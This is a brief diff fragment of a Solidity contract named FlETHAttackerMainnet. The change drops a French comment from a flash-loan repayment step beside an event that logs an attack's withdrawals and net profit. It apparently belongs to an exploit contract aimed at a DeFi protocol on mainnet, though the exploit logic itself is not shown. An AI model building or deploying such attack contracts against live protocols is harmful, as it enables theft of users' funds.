@@ -117,7 +117,7 @@ contract FlETHAttackerMainnet {
         emit AttackCompleted(totalWithdrawn, profitSecured, netProfit);
         uint256 toRepay = flashAmount;
         if (address(this).balance < toRepay) {
-            toRepay = address(this).balance; // Repayer ce qu'on peut
+            toRepay = address(this).balance;
         }
 
         WETH.deposit{value: toRepay}();
